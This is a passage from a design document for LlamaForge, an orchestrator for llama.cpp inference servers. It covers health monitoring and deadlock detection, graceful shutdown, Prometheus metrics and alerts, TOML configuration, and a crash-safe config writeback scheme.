   - If a server is restarted with a different `ctx_size` or `parallel_slots` via config reload, the ledger reservation is updated to the newly computed `estimated_vram_mb` for the new configuration.
   - **On server exit (any reason):** Remove the ledger entry immediately. NVML will reflect the freed VRAM within seconds.

This eliminates the TOCTOU race where two concurrent spawns both see 24GB free on the same GPU. The ledger is intentionally conservative — it always retains the worst-case computed reservation as a floor for the server's entire lifetime, using NVML only to detect underestimates (adjusting upward, never downward). The ledger exists specifically to prevent both the spawn TOCTOU race (two servers racing for the same VRAM) and the partial-allocation trap (NVML reflecting only active slots, not the full KV cache reservation). Without lifetime retention, co-located servers reliably OOM when traffic patterns shift and previously-idle slots become active.

**Process Lifecycle State Machine:**

```
                    ┌──────────┐
          ┌────────►│ Stopped  │◄─────────────┐
          │         └────┬─────┘              │
          │              │ start()            │ stop()
          │              ▼                    │
          │         ┌──────────┐              │
          │    ┌───►│ Starting │              │
          │    │    └────┬─────┘              │
          │    │         │ health_check OK    │
          │    │         ▼                    │
          │    │    ┌──────────┐              │
          │    │    │ Running  ├──────────────┤
          │    │    └────┬─────┘              │
          │    │         │ health_check FAIL  │
          │    │         ▼                    │
          │    │    ┌──────────┐              │
          │    └────┤Restarting│              │
          │         └────┬─────┘              │
          │              │ max_retries        │
          │              ▼                    │
          │         ┌──────────┐              │
          └─────────┤  Failed  ├──────────────┘
                    └──────────┘
```

**Health Monitoring:**

The Server Manager runs a Tokio task per server instance that:

Each server's monitoring task uses `tokio::select!` to race two detection channels:

- **Process exit watch:** `tokio::process::Child::wait()` future resolves instantly when the process exits (SIGSEGV, OOM kill, normal exit). This provides sub-millisecond crash detection with the exact exit code/signal.
- **HTTP health polling:** The periodic health check loop described below detects deadlocks, model loading failures, and other soft failures where the process is alive but unresponsive.

The process exit watch is the primary liveness signal. HTTP polling is for readiness and deadlock detection only.

1. Polls `GET /health` every 2 seconds with a **2-second HTTP timeout per health check**. Health check loops are staggered with `rand::thread_rng().gen_range(0..poll_interval)` initial delay per server to avoid synchronized bursts when managing many servers.
2. Polls `GET /slots` every 5 seconds to track slot utilization.
3. Scrapes `GET /metrics` every 10 seconds for Prometheus counters.
4. On health failure: waits 3 consecutive failures before triggering restart. **Failure classification matters:**
   - **Connection refused:** Server process crashed or not listening. Counts as a failure immediately.
   - **Timeout (transient):** Server is alive but busy (e.g., during a long prefill). Does **not** count toward the 3-failure threshold — logged as a warning, server remains in Running state.
   - **Timeout (deadlock detection):** If a server times out on **3 consecutive** health checks (6+ seconds), the Server Manager cross-references **both** the `/slots` endpoint **and** GPU utilization telemetry. A deadlock is diagnosed only when **all four conditions** are met simultaneously:
     1. **The server is believed to have active work:** EITHER `is_processing == true` on at least one slot in the last `/slots` response, OR `tracker.count() > 0` for this server (LlamaForge has dispatched a request that hasn't completed). A server with zero active work from both perspectives cannot be deadlocked — it is simply idle. The `tracker.count()` check is critical: if `llama-server` deadlocks *before* updating its slot state (e.g., frozen in the HTTP thread pool or slot acquisition mutex before assigning the request to a physical slot), the last `/slots` poll will permanently report `is_processing: false` — a stale snapshot from before the dispatch. Without the `tracker.count()` fallback, the detector concludes the server is idle and healthy, creating a permanent false negative. The dispatch tracker provides LlamaForge's own ground-truth view of outstanding work, independent of the backend's self-reported state. The idle-server false-positive protection is preserved: during off-peak periods with no traffic, `tracker.count()` is zero AND no slots are processing, so the condition correctly evaluates to false.
     2. `n_decoded` across all slots has not incremented since the last successful `/slots` poll (i.e., no token generation progress in ≥10 seconds despite having active work).
     3. GPU compute utilization (`llamaforge_gpu_utilization_pct`) for the server's assigned GPU(s) is **below 10%** for the same window. A healthy long-context prefill saturates GPU compute at 90-100%; a deadlocked CUDA kernel drops to near 0%. **Backend-dependent:** This signal is available on CUDA (NVML) and ROCm (rocm-smi-lib). On Metal, the CPU-usage fallback (see note below) substitutes for GPU utilization. On **CPU backends**, the `n_decoded` stall threshold in Condition 2 is **dynamically scaled** based on the dispatched request's prompt length (available from the request metadata): `stall_threshold = max(60s, (prompt_tokens / 500) * 2)`. This prevents false deadlock kills during legitimate long prefills (a 32K-token prompt on CPU can take 60+ seconds of pure prefill with zero decoded tokens). Additionally, CPU utilization (via `rusage`) is checked as a substitute for GPU utilization: a healthy CPU prefill shows ~100% CPU usage, while a deadlock shows near-zero. On **Vulkan backends**, the same dynamic stall threshold applies; GPU utilization via Vulkan compute timestamps is not reliably available, so the CPU usage check serves as the secondary signal. On both CPU and Vulkan backends, if `process_cpu_usage > 50%` during the `n_decoded` stall window, the server is considered to be performing active work (prefill) and the deadlock condition evaluates to false.
     4. The process is not in a known loading state (i.e., has previously passed at least one health check with `status: "ok"`).
   
     If all four conditions are met, the server is diagnosed as deadlocked (e.g., CUDA `Xid 79: Fallen off the bus`). The process is forcibly transitioned to `Restarting` state via `SIGKILL` (not `SIGTERM`, since a deadlocked process cannot handle signals gracefully). A `server.deadlock_detected` event is logged with the last known slot state and GPU utilization readings.
   
     If `n_decoded` is stalled but GPU utilization is high, the server is performing a long-context prefill — this is normal and healthy. The health check logs a `server.long_prefill` warning (for operator visibility) but does **not** count toward the failure threshold.
   
   > **Metal/macOS note:** On Apple Silicon, unified memory means GPU utilization metrics from IOKit are less granular than NVML. As a secondary signal on macOS, the deadlock detector also checks whether the `llama-server` process is consuming CPU cycles (via `rusage` or `proc_pid_rusage`). A process stuck in a deadlocked Metal command buffer will show near-zero CPU usage, whereas a prefill will show active CPU-side dispatch work.
   
   This four-signal classification prevents false restarts from three distinct causes: (1) killing a server during a legitimate long-context prefill (caught by GPU utilization check), (2) killing idle servers during off-peak periods (caught by the dual `is_processing` OR `tracker.count()` check), and (3) permanent outages from a genuinely deadlocked server that accepts TCP connections but never completes inference. The OR-based active-work check also prevents false *negatives*: a server that deadlocks before updating its slot state is still detected because the dispatch tracker reflects LlamaForge's dispatched-but-unconfirmed requests.
   - **Performance degradation detection:** A server that passes all health checks but operates at severely degraded throughput (due to thermal throttling, CUDA error recovery, memory contention, or driver issues) is detected via a rolling TPS baseline. The Server Manager maintains a 5-minute rolling average of `tokens_predicted` per second (from `/metrics` scrapes) for each server. If a server's measured generation TPS drops below **10% of its rolling average** for 60+ consecutive seconds while actively serving requests (`tracker.count() > 0`), a `server.performance_degraded` event is logged with the current TPS, the rolling average, and the degradation duration. The configurable `restart_on_degradation` option (default: `false`) controls whether the Server Manager automatically restarts the degraded server. When disabled, the event is logged and exposed via the management API — the operator decides. When enabled, the degraded server is transitioned to `Restarting` state via the normal graceful shutdown path (drain → abort → SIGTERM → SIGKILL). The 10% threshold and 60-second window are chosen to avoid false positives from legitimate throughput variance (e.g., switching from short to long prompts) while catching genuine degradation quickly.
5. On restart: uses exponential backoff with jitter (10±2s, 20±4s, 40±8s) up to `max_restart_attempts`. The ±20% jitter prevents synchronized restart storms when multiple servers sharing a GPU fail simultaneously (e.g., after a host-level GPU reset) — without jitter, both servers would follow identical backoff schedules and compete for VRAM allocation on every attempt.
6. **Staggered restart:** If multiple servers fail simultaneously (e.g., after a host-level GPU reset), restarts are staggered with a configurable `restart_stagger_secs` delay (default: 10) between each server to avoid thundering-herd VRAM contention and to allow the operator to intervene if a systemic issue is causing cascading failures. Operators with dedicated GPUs per server (no VRAM contention risk) can reduce this to 1-2 seconds for faster recovery; operators sharing GPUs across servers should increase it.

**Graceful Shutdown:**

When stopping a server:

1. **Stop routing** new requests to the server (mark as `Draining` in the scheduler).
2. **Re-queue queued requests:** Any requests in the priority queue that were destined for this server (but not yet dispatched) are transparently re-queued for routing to other servers. The client experiences additional latency but no visible error. These requests have no active HTTP connection to any backend — they exist only as entries in LlamaForge's in-memory priority queue.
3. **Drain dispatched requests with timeout:** Wait up to `shutdown_drain_timeout_secs` (default: `max(60, min(ctx_size / 30, 600))` seconds) for currently-dispatched requests to finish naturally. The formula uses `ctx_size / 30` as a conservative estimate of worst-case generation time at minimum TPS, capped at 600 seconds (10 minutes). Without the cap, a 128K context server would compute `max(60, 131072/30) = 4369 seconds ≈ 72 minutes` — a 16x overestimate, because `ctx_size` is the maximum *context window*, not the maximum *generation length*. A realistic worst case for 128K context is ~261 seconds (128K prompt prefill at ~1000 TPS + 4K generation at ~30 TPS). Operators with unusual workloads (e.g., very long generation with `max_tokens` close to `ctx_size`) should set `shutdown_drain_timeout_secs` explicitly in the server TOML. During the drain window, the backend continues serving its in-flight requests normally — only new routing is blocked.
4. **Abort remaining dispatched requests via CancellationToken:** Each proxy task receives a `tokio_util::sync::CancellationToken` at spawn time (one token per server, cloned per proxy task). The proxy task's main loop `select!`s between the response stream (`reqwest::Response::chunk().await`) and the cancellation signal (`token.cancelled().await`). On cancellation, the proxy writes the structured `FINISH_REASON_UPSTREAM_FAILURE` error payload (`{"error": "backend_shutdown", "phase": "prefilling"|"generating", "tokens_generated": N, "request_id": "..."}`), flushes the response, and drops cleanly. **[AP-7] The `select!` MUST use `biased;` and check cancellation BEFORE reading the next chunk: `select! { biased; _ = token.cancelled() => { yield error; break; }, chunk = response.chunk() => { yield chunk } }`.** If cancellation is checked after a chunk read, a token consumed from the TCP buffer between the read and yield is permanently lost on cancellation — producing invalid JSON/code output for the client. The `biased;` annotation ensures deterministic priority: cancellation always wins over a simultaneously-ready chunk. The shutdown coordinator calls `.cancel()` on the server's token, which wakes ALL proxy tasks simultaneously. LlamaForge then awaits a `JoinSet` of all proxy tasks for this server (with a short 5-second timeout for the flush) before proceeding to Step 5. This ensures every client receives a structured error with `gRPC UNAVAILABLE` / `HTTP 503` and a clear error message — LlamaForge sends this cancellation payload directly, it does NOT rely on the backend to emit it. The `DispatchToken` RAII guard releases the slot on task drop.
5. **Send SIGTERM** to the backend process (only after all proxy tasks from Step 4 have completed or the 5-second flush timeout has elapsed).
6. If not exited within 10s, **send SIGKILL**.

> **Why Step 4 must precede Step 5:** If SIGTERM (or SIGKILL) fires before LlamaForge aborts the remaining proxy streams, the OS tears down the backend's TCP sockets. The proxy tasks' `reqwest` futures fail with a connection-reset error, and the Tokio task's `Drop` handler fires — but `Drop` cannot `.await` the structured error write to the client. The client receives either a truncated SSE stream (no `[DONE]` marker, no `finish_reason`) or an ambiguous TCP RST. By aborting from LlamaForge's side first (Step 4), the proxy task has full async control: it writes the structured `FINISH_REASON_UPSTREAM_FAILURE` payload, flushes the response, and closes the connection cleanly — all before the backend process is signaled.
   
   > **Why not transparently re-queue prefilling requests?** An earlier design attempted to cancel prefilling requests (via `POST /slots/{slot_id}?action=erase`) and silently re-dispatch them to another server, arguing that "no tokens have been sent yet" makes this invisible to the client. This is wrong for three reasons:
   >
   > 1. **The HTTP connection already exists.** The client's `POST /v1/chat/completions` (or gRPC `StreamInference`) call has an open response stream. axum has already sent HTTP 200 and the `content-type: text/event-stream` header. Re-routing requires either (a) somehow splicing a new backend's SSE stream into the existing HTTP response — impossible without a recursive stream generator that manages its own retry loop, or (b) closing the existing connection and hoping the client retries — which is exactly what `FINISH_REASON_UPSTREAM_FAILURE` already does, but with a clear error code instead of an ambiguous connection reset.
   > 2. **Prefill is not free.** Re-dispatching to a new server restarts prompt processing from scratch. For a 32K-token prompt, this adds 5-15 seconds of invisible latency. The client's timeout budget is silently consumed without explanation.
   > 3. **Failure modes multiply.** The re-dispatch can itself fail (new server full, model evicted, network partition), requiring yet another layer of retry logic inside the drain path — a critical shutdown codepath that must be simple and reliable.
   >
   > The correct approach is straightforward: any request with an active HTTP connection to the draining server is aborted with a clear, typed error. The client's existing retry logic (which it must already have for network failures, 503s, and server crashes) handles recovery. This keeps the drain path simple, the error semantics honest, and the client in control of retry decisions.


### 5.4 Metrics Collector & Aggregator

Metrics flow through three tiers: per-request capture, aggregation, and export.

**Per-Request Metrics (captured for every inference request):**

| Metric | Type | Description | How Captured |
|--------|------|-------------|--------------|
| `request_id` | String | UUIDv7 identifier | Generated at admission |
| `ttft_ms` | f64 | Time-to-first-token in milliseconds | `t_first_token - t_request_dispatched` |
| `generation_tps` | f64 | Tokens per second during generation | `completion_tokens / generation_duration`. If `completion_tokens = 0` (model immediately produces stop token, or request errors before generation), set to `0.0` — do NOT compute `0/0`. Skip histogram observation for `llamaforge_generation_duration_seconds` to avoid Prometheus `_count`/`_sum` divergence from NaN observations. |
| `prompt_tps` | f64 | Prompt processing speed (tokens/s) | Captured from llama-server's response (prompt processing time is reported in completion responses); falls back to timestamp-based approximation (`prompt_tokens / prefill_duration`) if not available |
| `total_latency_ms` | f64 | End-to-end latency including queue wait | `t_response_complete - t_request_received` |
| `queue_wait_ms` | f64 | Time spent in the queue | `t_request_dispatched - t_request_received` |
| `prompt_tokens` | u32 | Number of prompt tokens | From llama-server response |
| `completion_tokens` | u32 | Number of generated tokens | From llama-server response |
| `model_name` | String | Which model served the request | From routing decision |
| `server_id` | String | Which server instance | From routing decision |
| `slot_id` | u32 | Which slot on the server | From llama-server response |
| `task_type` | String | The request's task_type | From request metadata |
| `requestor` | String | Who made the request | From request metadata |
| `effective_priority` | u32 | Computed priority at dispatch time | From scheduler |
| `was_evicted` | bool | Whether this request was evicted at least once | From eviction tracker |
| `eviction_count` | u32 | How many times this request was evicted | From eviction tracker |
| `status` | Enum | `completed`, `failed`, `cancelled`, `evicted`, `timeout` | Final disposition |
| `error_message` | Option | Error detail if status != completed | From downstream |

**Derived / Aggregated Metrics:**

| Metric | Formula | Granularity |
|--------|---------|-------------|
| **Throughput** | Total tokens generated / time window | Per-server, global, per-model |
| **Goodput** | Tokens from completed requests only / time window | Per-server, global, per-model |
| **Effective Utilization** | (active slot-seconds) / (total slot-seconds) | Per-server |
| **Queue Depth** | Current queue length | Real-time gauge |
| **P50/P95/P99 TTFT** | Percentile over sliding window | Per-model, per-task-type |
| **P50/P95/P99 Latency** | Percentile over sliding window | Per-model, per-task-type |
| **Eviction Rate** | Evictions / total requests over window | Global, per-priority-level |
| **Error Rate** | Failed requests / total requests | Per-server, global |
| **KV Cache Utilization** | From llama-server `/metrics` | Per-server (not applicable for `recurrent` architecture servers -- metric is omitted) |
| **Context Shift Rate** | Context shifts detected / time window | Per-server. Context shifts cause latency spikes as the KV cache is reorganized; track to detect servers running at context limits. |
| **Speculative Acceptance Rate** | Accepted draft tokens / total draft tokens | Per-server (only for servers with `speculative_method != "none"`) |
| **Speculation Depth** | Average accepted tokens per speculation step | Per-request and per-server |

**Storage Tiers:**

1. **Hot (in-memory):** Last 5 minutes of per-request metrics in a time-bounded sliding window that evicts entries older than 5 minutes. A safety cap of 100,000 entries is enforced — if the window exceeds this limit, the oldest entries are evicted regardless of age. At realistic llama.cpp throughput (1-10 req/s with 2-4 GPUs), 5 minutes produces 300-3,000 entries × ~200 bytes ≈ 600KB. The 100,000-entry cap bounds the worst case to ~20MB. Used for real-time dashboard and P50/P95/P99 calculations.
2. **Warm (SQLite):** All per-request metrics, retained for 30 days (configurable). Queryable via the Management API.
3. **Export (Prometheus):** Counters and gauges exported at `/metrics` for scraping. Aggregated, not per-request.

**Prometheus Metrics Exported:**

```
# Counters
llamaforge_requests_total{model, task_type_class, requestor_class, status}
llamaforge_tokens_prompt_total{model, server_id}
llamaforge_tokens_completion_total{model, server_id}
llamaforge_evictions_total{reason}
llamaforge_queue_timeouts_total

# Gauges
llamaforge_queue_depth{priority_level}
llamaforge_active_requests{model, server_id}
llamaforge_server_status{server_id}  # 0=stopped, 1=starting, 2=running, 3=failed
llamaforge_pending_dispatches{server_id}  # Current tracker.count() (AtomicU32) — requests dispatched but not yet confirmed by /slots
  # Essential for debugging perceived routing stalls: if /slots shows idle capacity but
  # pending_dispatches is high, the orchestrator has dispatched requests that haven't
  # been picked up by the server yet. Without this gauge, operators see hardware utilization
  # mismatched with the orchestrator's routing behavior. Uses the O(1) AtomicU32 sidecar,
  # not DashSet::len(), so gauge collection never contends with the routing hot path.

# Histograms (with LLM-tuned bucket boundaries)
llamaforge_ttft_seconds{model, task_type_class}
  # Buckets: 0.005, 0.01, 0.025, 0.05, 0.1, 0.25, 0.5, 1.0, 2.5, 5.0, 10.0, 30.0, 60.0, 120.0, 300.0
  # Sub-10ms resolution (0.005s) captures fast-GPU short-context TTFT (A100 with 2K tokens: TTFT < 1ms).
  # Extended upper range (60-300s) captures 128K context prefills on consumer hardware:
  # RTX 3060-4090 at 128K: 30-120s; Apple Silicon at 128K: 100-400s.
  # Without these upper buckets, everything above 30s collapses into +Inf, destroying resolution
  # for the long-context workloads operators most want to monitor.
llamaforge_request_duration_seconds{model, task_type_class}
  # Buckets: 0.1, 0.5, 1.0, 2.5, 5.0, 10.0, 30.0, 60.0, 120.0, 300.0
llamaforge_queue_wait_seconds{priority_level}
  # Buckets: 0.01, 0.1, 0.25, 0.5, 1.0, 5.0, 15.0, 30.0, 60.0, 120.0, 300.0
  # 0.25s bucket fills the 5× gap between 0.1s and 0.5s for moderate-queue resolution
llamaforge_generation_duration_seconds{model}
  # Buckets: 0.1, 0.5, 1.0, 2.5, 5.0, 10.0, 30.0, 60.0, 120.0, 300.0
  # Use with llamaforge_tokens_completion_total to compute TPS via PromQL:
  # rate(llamaforge_tokens_completion_total[5m]) / rate(llamaforge_generation_duration_seconds_sum[5m])
llamaforge_prompt_processing_seconds{model}
  # Buckets: 0.005, 0.01, 0.025, 0.05, 0.1, 0.25, 0.5, 1.0, 2.5, 5.0, 10.0, 30.0, 60.0, 120.0
  # Derived from prompt_tokens / prompt_tps (gives prefill duration in seconds).
  # Enables "p99 prefill taking 5x longer than usual" alerts via PromQL:
  # histogram_quantile(0.99, rate(llamaforge_prompt_processing_seconds_bucket[5m]))
  # Without this histogram, prompt_tps is only available in per-request SQLite records —
  # operators cannot see prefill throughput degradation from Grafana without querying SQLite.

# Counters (additional)
llamaforge_context_shifts_total{server_id}
  # Context shifts cause latency spikes; track to detect servers at context limits
llamaforge_speculative_draft_tokens_total{server_id}
llamaforge_speculative_accepted_tokens_total{server_id}
llamaforge_server_crashes_total{server_id, exit_reason}  # "oom", "signal", "deadlock", "unknown"
  # The server_status gauge captures current state but misses crashes between scrape intervals. This counter provides a monotonic crash history.
  # NOTE: An earlier design had `gateway_restarts_total` as a counter initialized to 1 on boot.
  # This was removed because `rate()` of a constant is always 0 — the metric provides no
  # information beyond Prometheus's built-in `up` metric and `resets()` function.
  # For restart detection, use: `changes(up{job="llamaforge"}[1h]) > 1` (standard pattern).
  # `process_start_time_seconds` (from the Prometheus client library, emitted automatically)
  # provides the exact boot timestamp for staleness detection.
llamaforge_cancellations_dropped_total
  # Incremented when the bounded cancellation channel's try_send() returns Full.
  # Non-zero indicates catastrophic backpressure (disk stall). Alert threshold: > 0.
llamaforge_events_dropped_total
  # Incremented when the telemetry channel's try_send() returns Full (channel capacity: 10,000).
  # Non-zero indicates the SQLite writer thread cannot keep up with event volume — telemetry
  # data is being silently lost. Operationally critical: this is the ONLY signal that
  # observability events are missing. Alert threshold: rate > 0 sustained for 30+ seconds.
llamaforge_orphan_slots_erased_total{server_id}
  # Incremented when the reverse reconciliation pass (Section 10.2) erases a backend
  # slot that has no corresponding entry in LlamaForge's slot_dispatch_map. Non-zero sustained
  # rate indicates systemic cancellation delivery failure. Alert threshold: > 0.

# Gauges (additional)
llamaforge_speculative_acceptance_rate{server_id}
  # Only emitted for servers with speculative_method != "none".
  # When a server's speculative_method changes to "none" (draft model removed via config reload),
  # the gauge is explicitly unregistered for that server_id to prevent stale phantom readings.
  # Without unregistration, Prometheus retains the last value for up to 5 minutes (staleness timeout),
  # causing dashboards to display a phantom acceptance rate for a non-speculative server.

# GPU telemetry (via NVML / sysctl)
llamaforge_gpu_vram_total_bytes{gpu_id}
llamaforge_gpu_vram_free_bytes{gpu_id}
llamaforge_gpu_vram_reserved_bytes{gpu_id}   # From the VRAM reservation ledger
llamaforge_gpu_utilization_pct{gpu_id}        # GPU compute utilization (0-100)
llamaforge_gpu_temperature_celsius{gpu_id}

# Note: GPU telemetry is polled every 10 seconds via NVML (Linux/CUDA) or IOKit (macOS/Metal).
# On systems without NVML (CPU-only, Vulkan, ROCm without rocm-smi), these gauges are absent.
# The VRAM reservation ledger gauge is always present and tracks LlamaForge's internal bookkeeping.

# Process-level telemetry
llamaforge_process_start_time_seconds
  # Unix timestamp of when the LlamaForge process started. Set once at startup. If LlamaForge
  # panics, OOMs, or is otherwise restarted by systemd/Docker, this value changes — operators
  # can detect silent gateway restarts by alerting on changes to this gauge. Without this,
  # a gateway restart followed by seamless orphan recovery produces only a throughput dip
  # with no crash signal in the logs (since the old process's logs may be lost).
llamaforge_audit_channel_pending
  # Current number of messages in the audit channel. Alert if > 80% of capacity (800/1000)
  # for more than 30 seconds — indicates SQLite writer stall.
```

**Recommended Alert Runbook:**

| Metric / Condition | Threshold | Operator Action |
|-------------------|-----------|-----------------|
| `llamaforge_audit_channel_pending > 800` | Sustained > 30s | SQLite writer stall — check disk I/O, WAL size, writer thread health |
| `rate(llamaforge_orphan_slots_erased_total) > 0` | Any sustained rate | Systemic cancellation delivery failure — check cancellation channel, audit pipeline |
| `changes(up{job="llamaforge"}[1h]) > 1` | Any | Gateway crash loop — check logs, memory limits, panic backtraces |
| `rate(llamaforge_cancellations_dropped_total) > 0` | Any | Catastrophic backpressure — disk stall or writer thread panic |
| `rate(llamaforge_events_dropped_total[1m]) > 0` | Sustained > 30s | Telemetry loss — writer thread cannot keep up, check SQLite lock contention |
| `llamaforge_server_status != "running"` | > 60s | Server stuck in non-running state — check health logs, VRAM availability |
| `rate(llamaforge_server_crashes_total[5m]) > 0.1` | Sustained | Server crash loop — check exit_reason label (oom, signal, deadlock) |
| WAL file size > 100MB | Periodic check | WAL not checkpointing — possible writer stall or reader holding read transaction |
| `llamaforge_writer_thread_alive == 0` | Any | Writer thread panicked — audit log frozen, restart required |

> **Cardinality protection — `requestor_class` label:** The `requestor_class` label in `llamaforge_requests_total` is a **bounded enum**, NOT the raw `requestor` string from the request metadata. If the raw `requestor` string were used as a Prometheus label, arbitrary client-supplied values (user IDs, dynamic CI job names, UUIDs) would create unbounded cardinality — each unique string becomes a new time series. At 100 unique requestors × 5 models × 10 task types × 4 statuses = 20,000 series, this will degrade Prometheus query performance; at 10,000 unique requestors, it will crash the scraping instance.
>
> The `requestor_class` enum is defined in `priority_rules.toml`:
>
> ```toml
> [requestor_classes]
> # Maps raw requestor strings to bounded metric classes.
> # Any requestor not listed here is mapped to "unknown".
> "arxiv-assistant" = "arxiv_assistant"
> "ci-pipeline" = "ci_pipeline"
> "interactive-ui" = "interactive_ui"
> # Add new classes as you onboard new clients.
> ```
>
> The mapping is applied at request admission time: the raw `requestor` string (from `RequestMetadata.requestor` or `X-Requestor` header) is looked up in the `requestor_classes` map. If found, the corresponding class name is used as the Prometheus label value. If not found, `"unknown"` is used. The raw `requestor` string is still stored in SQLite `request_metrics.requestor` for per-request querying — only the Prometheus label is bounded.
>
> Initial enum values: `unknown`, `arxiv_assistant`, `ci_pipeline`, `interactive_ui`. New classes are added by editing `priority_rules.toml` and sending `SIGHUP` — no binary recompilation required.
>
> **[G-17] Unknown requestor class warning:** If `requestor_class = "unknown"` exceeds 50% of requests over a 24-hour sliding window, a `config.unmapped_requestors_high` warning is logged with the top-5 unmapped requestor strings by volume. This prevents silent observability degradation as organic traffic grows beyond the initial requestor mapping. The check runs every hour as part of the metrics housekeeping task and uses the SQLite `request_metrics.requestor` column for the top-N aggregation.

> **Note on recurrent architectures:** The `kv_cache_usage_ratio` metric in `ServerMetricsSnapshot` and the `llamaforge_server_kv_cache_usage` gauge are not emitted for servers with `model_architecture = "recurrent"`. Dashboards should handle missing values gracefully.

### 5.5 Config Manager & Web UI

**Configuration Hierarchy:**

```
/etc/llamaforge/
├── llamaforge.toml          # Main config (servers, globals)
├── priority_rules.toml      # Task type priorities, requestor bonuses
└── models/                  # Model metadata (optional)
    └── llama-3.1-8b.toml
```

**Main Config (`llamaforge.toml`):**

```toml
[global]
bind_address = "127.0.0.1"        # Set to "0.0.0.0" for production behind a reverse proxy
grpc_port = 50051                # Primary gRPC API
http_port = 8000                 # OpenAI shim + management + Web UI
log_level = "info"
log_format = "json"              # "json" or "pretty"
metrics_db_path = "./llamaforge.db"
metrics_retention_days = 30
queue_max_depth = 1000
queue_default_timeout_secs = 300
restart_stagger_secs = 10        # Delay between sequential server restarts (VRAM contention guard)
api_key = "sk-llamaforge-..."    # Optional, empty = no auth

[grpc]
max_message_size_mb = 16         # Max protobuf message size
keepalive_interval_secs = 30
keepalive_timeout_secs = 10
max_concurrent_streams = 1000

[grpc.tls]
enabled = false
cert_path = ""                   # PEM certificate
key_path = ""                    # PEM private key

[prometheus]
enabled = true
endpoint = "/metrics"

[web_ui]
enabled = true
serve_path = "/ui"

[servers.llama-8b-gpu0]
# ... (as shown in 4.3)

[servers.codellama-gpu1]
model_path = "/models/codellama-34b-Q4_K_M.gguf"
alias = "codellama-34b"
port = 8082
model_architecture = "transformer"
backend = "cuda"
devices = ["gpu:1"]
gpu_layers = 99
parallel_slots = 2
ctx_size = 16384
cache_type_k = "q8_0"
cache_type_v = "q8_0"
flash_attn = "auto"
```

**Priority Rules (`priority_rules.toml`):**

```toml
[task_types]
emergency = 1000
realtime_chat = 800
code_generation = 700
code_review = 600
summarization = 500
batch_analysis = 400
embedding = 300
background = 200
backfill = 100

[custom_task_types]
# Priority for Custom(String) task types. Unknown custom types default to base_priority=0
# with a warning logged on first occurrence. Define entries here to assign priorities.
# "my_special_task" = 450

[task_type_classes]
# Bounded enum mapping for Prometheus labels (same pattern as requestor_class).
# Built-in TaskType variants map to themselves automatically.
# Custom types map to "custom" unless explicitly mapped here.
# "my_special_task" = "standard"
# Classes: "emergency", "realtime", "standard", "background", "custom"

[requestor_bonuses]
"ci-pipeline" = 100
"interactive-ui" = 50
"monitoring-service" = 75
"batch-worker" = 0

[starvation]
check_interval_secs = 5
boost_scale = 50                   # Multiplier for logarithmic boost curve
boost_start_after_secs = 30
max_boost = 400

[fair_share]
# Minimum slot percentage reserved per priority tier.
# These three values MUST sum to 100. At startup, LlamaForge validates
# the sum: if it does not equal 100, the values are normalized
# proportionally (preserving ratios) and a warning is logged.
high_tier_min_pct = 60             # emergency + realtime
standard_tier_min_pct = 30         # code_gen, code_review, summarization
low_tier_min_pct = 10              # background + backfill

[preemption]
# v1: queue-only preemption (no in-flight eviction)
# v2 will add prefill-only eviction with these settings:
# enabled = false                  # Set to true in v2
# min_priority_gap = 200
# prefill_only = true
```

**Web UI Features:**

The web UI is a single-page application served at `/ui`. It provides:

1. **Dashboard:** Real-time overview of all servers, queue depth, throughput, error rates, and top-line metrics.
2. **Server Management:** Start/stop/restart servers, edit configuration, view slot status, view per-server metrics.
3. **Queue Inspector:** View all queued requests, their priorities, position, and estimated wait. Cancel or boost individual requests.
4. **Request Explorer:** Query historical requests from SQLite. Filter by model, task_type, requestor, time range, status. View per-request metrics.
5. **Configuration Editor:** View current server configurations, priority rules, and global settings (read-only). To apply changes, edit the TOML config files and send `SIGHUP` or click the "Reload Config" button (which triggers `POST /api/config/reload`).
6. **Model Registry:** View all loaded models, their server assignments, and performance characteristics.

**Configuration Source of Truth (Declarative / GitOps with Config Writeback):**

The TOML config files (`llamaforge.toml`, `priority_rules.toml`) are the **single source of truth** for all server and scheduling configuration. LlamaForge reads the config files at startup and on `SIGHUP`. The general `PUT /api/config` endpoint is removed — bulk config changes require editing the TOML files and triggering a reload.

However, specific operational mutations (currently: LoRA adapter load/unload via `POST /api/servers/{id}/lora-adapters`) are **persisted back to the TOML config file** to keep runtime state and declarative config in sync.

> **Deprecation notice (v1.1):** The TOML writeback protocol below is the v1.0 implementation. It will be replaced by the `ConfigOverlayStore` trait (Section 13.3) in v1.1, which persists runtime overrides to a SQLite table instead of mutating the TOML file. The overlay model eliminates the filesystem permission, formatting, and atomicity issues documented below. See Section 13.3 for the migration timeline and feature flag.

**Config Writeback Protocol:**

1. The API handler applies the runtime change (e.g., issues `POST /lora-adapters` to `llama-server`).
2. On success, the handler offloads the entire file I/O sequence to `tokio::task::spawn_blocking` to prevent Tokio reactor starvation (see **Blocking I/O Justification** below). Inside the blocking task:
   - It acquires an exclusive file lock (`flock`) on a **lock file** located in the LlamaForge **state directory** (`$LLAMAFORGE_STATE_DIR/config.lock`, default: `/var/run/llamaforge/config.lock`), NOT adjacent to the config file.
   - It re-reads the TOML from disk (to pick up any concurrent manual edits), applies the mutation to the parsed structure, and writes the updated TOML back via a **crash-safe two-phase write strategy**:
   
     **Phase 1 (preferred): Atomic rename.** Write the new TOML to a temp file in the state directory (`$LLAMAFORGE_STATE_DIR/config.tmp`), `fsync()` it, then `rename()` over the config path. This is fully crash-safe — `rename()` is atomic on POSIX: either the old or the new content is visible, never a truncated file.
     
     **Phase 2 (fallback): In-place truncation.** If `rename()` fails with `EXDEV` (state directory and config file are on different filesystems) or `EACCES` (rootless deployment where the config directory is owned by root), fall back to in-place truncation (`O_WRONLY | O_TRUNC` + single `write_all()` + `fsync()`). The crash window for this path is microseconds (a single `write_all` of a few KB TOML). As a safety net, the pre-truncation content is cached in memory as a rollback snapshot — if `write_all()` or `fsync()` fails, the rollback snapshot is re-written.
   
   > **Why the two-phase strategy?** An earlier design used in-place truncation exclusively. While the crash window is small, a hard kill (`kill -9`, OOM killer, power loss) between truncation and `write_all` completion permanently leaves a 0-byte config file, bricking the deployment. On containerized deployments where OOM kills are common, this is a realistic failure mode. The atomic rename path eliminates the crash window entirely for the common case. The in-place truncation fallback preserves correctness for rootless deployments where `rename()` is a directory operation requiring write permission on the config directory (which may be owned by root in container images). The startup safety check (see below) detects empty/corrupt config files from either path.
   - It releases the file lock and returns the serialized diff to the caller.
3. Back on the async task, the handler logs a `config.writeback` event with the diff and updates the in-memory config.

